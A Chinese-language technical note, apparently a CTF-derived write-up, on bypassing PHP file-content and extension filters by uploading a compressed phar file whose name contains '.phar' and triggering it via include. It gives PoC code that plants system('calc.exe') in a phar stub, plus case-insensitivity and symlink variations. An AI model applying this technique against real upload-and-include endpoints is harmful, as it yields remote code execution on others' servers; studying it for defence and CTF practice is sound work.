...
## phar 与文件包含
- [当include邂逅phar——DeadsecCTF2025 baby-web – fushulingのblog](https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/)
- [php 文件上传不含一句 php 代码 RCE 最新新姿势](https://mp.weixin.qq.com/s/AVXVkmZLAaVQeNp_ib3DFQ)

利用手法来自于 DeadSecCTF 2025，使用场景如下：
1. 存在文件包含，但存在文件内容校验（比如 <?php ），无法直接写入 php 代码。
2. 存在文件上传，但文件后缀存在过滤（比如只能为图片）。

此时常规手法无法包含 php 代码。但 php 文件包含操作（include、require 等）具有一个特殊操作：
1. 在解析路径时，如果路径中包含 `.phar` 但不包含 `://` 的话，则会对指定的文件进行 phar 解析。（路径中包含 .phar 即可，并不一定是后缀，比如 1.phar.gif）
2. phar 支持多种格式的压缩，比如将 phar 压缩为 tar、gzip、bzip2、zip。php 在处理时，都会对其进行自动解压。

因此，利用步骤如下：
1. 上传包含 php 代码的 phar 文件，压缩之后即可绕过文件内容校验。
2. 文件名中包含 .phar，比如 1.phar.gif
3. 触发文件包含：include /xxx/1.phar.gif
4. php 会先进行解压该 phar，解压后还原正常的 php 代码，再进行包含。
### POC
注意：与 phar 反序列化不同，利用 phar 触发反序列化时，需要将序列化内容写入 metadata 部分。
...
?>
```
但是在做文件包含时，需要将 payload 填充到 Stub 中。
```php
<?php
@unlink("test.phar");
$phar = new Phar("test.phar.ggg");
$phar->startBuffering();
$phar->setStub("<?php system(\"calc.exe\");__HALT_COMPILER(); ?>");
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
```
test.php
```php
<?php
include "test.phar.ggg";
```
文件名中只需要包含 .phar 即可。

==windows NTFS 对大小写不敏感==，比如本地生成的文件名为：`test.phar.ggg`，但是包含的时候写成 PhaR 也可以正常触发。
```php
<?php
include "test.PhaR.ggg";
```

==只需要路径中包含 .phar 即可，哪怕是目录==

测试的时候发现软链接也可以使用，比如在 /tmp.test.1 创建一个软链接。
```bash
ln -s `pwd`/test.phar.gz /tmp/test.1
```
然后文件包含该软链接，即使 include 传入的文件名不包含 phar，也可以正常触发。
```php
<?php
include_once "/tmp/test.1";
```
